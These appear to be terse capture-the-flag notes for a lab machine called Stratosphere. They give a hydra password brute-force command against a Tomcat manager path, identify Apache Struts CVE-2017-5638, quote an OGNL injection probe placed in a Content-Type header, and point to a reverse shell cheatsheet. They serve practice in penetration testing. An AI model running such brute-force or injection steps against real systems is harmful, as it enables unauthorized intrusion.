
# Stratosphere

```
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager
```
google > identify struts version > cve-2017-5638
> https://blog.qualys.com/product-tech/2017/03/14/apache-struts-cve-2017-5638-vulnerability-and-the-qualys-solution
```
Content-Type: %{#context[‘com.opensymphony.xwork2.dispatcher.HttpServletResponse’].addHeader(‘X-Qualys-Struts’,3195*5088)}.multipart/form-data
```
google > reverse shell cheatsheet

